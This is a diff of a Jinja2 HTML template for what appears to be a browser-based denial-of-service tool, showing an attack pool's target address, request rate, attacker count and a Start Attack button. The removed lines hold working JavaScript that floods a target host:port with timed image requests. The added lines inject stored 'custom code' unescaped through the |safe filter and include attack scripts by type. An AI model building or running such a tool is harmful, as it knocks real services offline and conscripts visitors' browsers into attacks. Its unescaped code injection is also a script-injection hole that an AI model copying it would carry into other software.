@@ -1,66 +1,54 @@
 {% extends "base.html" %}
 
 {% block content %}
-<div class='columns'> 
-  <div class='column'> 
-    <h2>{{pool.name}}</h1>
 
+<div class="container" style="padding:2em">
+  <div class="columns">
+    <div class="column col-6 col-sm-11">
+
+    <h1>{{pool.name}}</h1>
     <div id='pool-target'>Target: {{pool.target_address}} </div>
     <div id='pool-comment'>Comment: {{pool.comment}}</div>
     <div id='pool-rpm' >RPM: <div style="display: inline;" id='rpm'>{{pool.rpm}}</div> </div>
     <div id='pool-name'>Number Attackers {{pool.number_attackers}}</div>
-
     <input id='speed' type="number">
     <button id='startButton'>Start Attack</button>
-  </div>
-  <div class='column'>
 
   </div>
+
+  <div class="column col-6 hide-sm col-sm-0 "> 
+      <pre><code id='displayCode' class="language-javascript"></code></pre>
+    </div>
+      
+
 </div>
+</div>
+
+
 
 {% endblock %}
 
-
 {% block script %}
 {% if pool.attack_type == 'Custom Code' %}
-<script id='customCode' type=text/javascript>
+<script id='attackCode' type=text/javascript>
 {{ pool.custom_code|safe }}
 </script>
 
 
-<script type=text/javascript>
-let customCode = $('#customCode').val()
-</script>
 
 {% else %}
-<script type=text/javascript>
 
-var rpm = window.document.getElementById('rpm')
-
-function attack(){
-  var domain = '{{pool.target_address}}';
-  var img = document.createElement('img');
-  img.setAttribute('src', domain  + ':' + '{{pool.port}}' + '/image' + new Date().getTime() + Math.floor(Math.random() * 10 ));
-  //document.body.appendChild(img);
-  rpm.innerText = parseInt(rpm.innerText) + 1
-
-}
-let attackInterval;
-window.document.getElementById('startButton').onclick = function(){
-var speed = window.document.getElementById('speed').value
-var btn = window.document.getElementById('startButton')
-
-  if (btn.innerText == 'Start'){
-  btn.innerText = 'Stop'
-
-   attackInterval = setInterval(attack, 1000/speed)
-   
-  }else{
-    clearInterval(attackInterval)
-
-    btn.innerText = 'Start'
-  }
-}
+{% set attackType = pool.attack_type %}
+<script id="attackCode"> 
+  {% include 'attack_script/'+attackType+'.jinja2'%}
 </script>
 {% endif %}
+
+{#  General Code for pool page    #}
+<script type=text/javascript>
+  //display code in DOM
+  let customCode = $('#attackCode').text();
+  $('#displayCode').text(customCode);
+  </script>
+
 {% endblock %}
